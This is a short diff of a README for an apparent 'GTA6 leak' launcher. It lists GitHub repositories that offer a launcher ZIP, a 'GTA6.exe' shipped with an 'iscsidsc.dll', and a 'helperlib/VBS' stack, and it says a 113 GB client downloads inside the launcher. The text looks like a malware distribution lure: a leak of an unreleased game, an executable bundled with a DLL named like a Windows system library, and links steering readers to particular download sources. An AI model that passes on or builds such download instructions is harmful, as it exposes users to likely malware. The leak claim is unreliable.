@@ -30,7 +30,7 @@ Windows x64 only. Client **~113 GB** downloads **inside** the launcher. Not a 11
 ## Repos
 
 - [GTA6-CyberLeak-Launcher](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher) — launcher ZIP, tag `123`
-- [gta-6-runtime-gup-exe](https://github.com/FoxyYT1/gta-6-runtime-gup-exe) — FIX RUNTIME (`GTA6.exe` + `iscsidsc.dll`)
+- [gta-6-runtime-gup-exe](https://github.com/FoxyYT1/gta-6-runtime-gup-exe) — `GTA6.exe` + `iscsidsc.dll`
 - [gta-6-runtime-helperlib-dll](https://github.com/FoxyYT1/gta-6-runtime-helperlib-dll) — **legacy redirect** (old helperlib/VBS stack is obsolete)
 
 Do not use dead links to **github.com/cyberleekgta6** or **HubMicraRu**.
